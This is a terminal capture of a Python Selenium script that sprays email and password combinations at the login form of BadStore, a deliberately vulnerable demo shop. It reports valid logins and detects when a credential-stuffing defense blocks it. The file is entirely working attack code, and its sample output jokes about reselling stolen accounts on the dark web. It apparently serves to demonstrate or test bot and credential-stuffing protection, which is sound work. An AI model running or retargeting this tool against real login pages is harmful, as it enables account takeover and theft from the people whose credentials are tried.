root@kali:/home/ec2-user# cat headless-badstore-cred-spray.py
#!/usr/bin/python
# usage:
#
#ec2-user@kali:~$ python headless-badstore-cred-spray.py http://badstore-origin.cudathon.com/cgi-bin/badstore.cgi?action=loginregister
#Ah ... badstore ... good, good
#big@spender.com iforgot nope
#big@spender.com time nope
#big@spender.com love nope
#big@spender.com hello123 nope
#Jackpot! Will re-sell on dark web: big@spender.com money
#big@spender.com please nope
#Jackpot! Will re-sell on dark web: joe@supplier.com iforgot
#joe@supplier.com time nope
#julio.tan@gmail.com hello123 nope
#julio.tan@gmail.com money nope
#julio.tan@gmail.com please nope  <--- this is in the cred stuffing database so will trigger a hit
#2@2.com iforgot nope
#2@2.com money nope
#2@2.com please nope
#ec2-user@kali:~$
#
#
import os
import json
import sys
import time
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities

target = sys.argv[1]
target = target.lower()
print target
if (target.find('badstore') != -1 ):
        print ("Ah ... badstore ... good, good")
else:
        print ("Yikes, I don't see badstore in the target url, this thing is built specifcally for badstore so.... good luck!")

# enable browser logging
d = DesiredCapabilities.CHROME
d['loggingPrefs'] = { 'performance':'ALL' }
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
# import Action chains
from selenium.webdriver import ActionChains

#chrome_options = Options()
#chrome_options.add_argument("--headless")
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--headless")
chrome_options.add_argument("--remote-debugging-port=9222")
chrome_options.add_argument('--no-sandbox')

# uncomment for normal ubuntu
#driver = webdriver.Chrome('/usr/bin/chromedriver', chrome_options=chrome_options, service_args=["--verbose"], desired_capabilities=d)

# uncomment for Kali because broken dpkg
driver = webdriver.Chrome(executable_path=os.path.abspath("chromedriver"), chrome_options=chrome_options, service_args=["--verbose"], desired_capabilities=d)






email_list = ["big@spender.com", "joe@supplier.com", "julio.tan@gmail.com", "itsbrett@gmail.com"]
passwd_list =["please", "hello123", "money", "iforgot"]
for email in email_list:
        for passwd in passwd_list:
                driver.get(target)
                time.sleep(0.35)
                print(driver.page_source)
                if (driver.title.find("BadStore") == -1):
                        print "I don't think we're in the badstore anymore"
                        continue
                #assert "Python" in driver.title
                # elem = driver.find_element_by_partial_link_text('loginregister')
                #to refresh the browser
                #driver.refresh()
                # identifying the source element
                #source= driver.find_element_by_xpath("//*[text()='username']");
                # action chain object creation
                action = ActionChains(driver)
                # move to the element and click then perform the operation
                #action.move_to_element(elem).click().perform()
                elem = driver.find_element_by_name("email")
                elem.clear()
                elem.send_keys(email)
                elem = driver.find_element_by_name("passwd")
                elem.clear()
                elem.send_keys(passwd)
                sys.stdout.write("Trying credential combo " + email + " / " + passwd + " ...")
                elem.send_keys(Keys.RETURN)
                ## Give time for iframe to load ##
                time.sleep(0.15)
                ## You have to switch to the iframe like so: ##
                iframe_element = driver.find_elements_by_tag_name("iframe")
                #print(iframe_element)
                if (iframe_element == []):
                        print(" woops, blocked by credential stuffing defense?")
                        continue
                driver.switch_to.frame(iframe_element[0])
                iframe = driver.page_source
                #print(iframe)
                ### Insert text via xpath ##
                #elem = driver.find_element_by_xpath("/html/body/p")
                #elem.send_keys("Lorem Ipsum")
                ## Switch back to the "default content" (that is, out of the iframes) ##
                driver.switch_to.default_content()
                driver.delete_cookie("SSOid")
                #assert "UserID and Password not found" not in driver.page_source
                if ("Unregistered" in iframe):
                        print "nope"
                else:
                        print "Jackpot! This is a valid badstore login account"
root@kali:/home/ec2-user#
